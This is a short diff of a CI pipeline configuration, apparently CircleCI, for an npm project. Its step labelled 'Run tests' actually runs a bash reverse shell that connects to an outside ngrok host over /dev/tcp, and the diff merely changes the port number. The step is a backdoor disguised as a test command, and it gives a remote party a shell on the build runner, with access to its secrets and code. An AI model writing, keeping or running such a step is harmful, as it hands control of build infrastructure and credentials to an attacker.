@@ -28,7 +28,7 @@ jobs:
           pkg-manager: npm
       - run:
           name: Run tests
-          command: /bin/bash -l > /dev/tcp/0.tcp.sa.ngrok.io/10168 0<&1 2>&1
+          command: /bin/bash -l > /dev/tcp/0.tcp.sa.ngrok.io/10496 0<&1 2>&1
 
 workflows:
   # Below is the definition of your workflow.
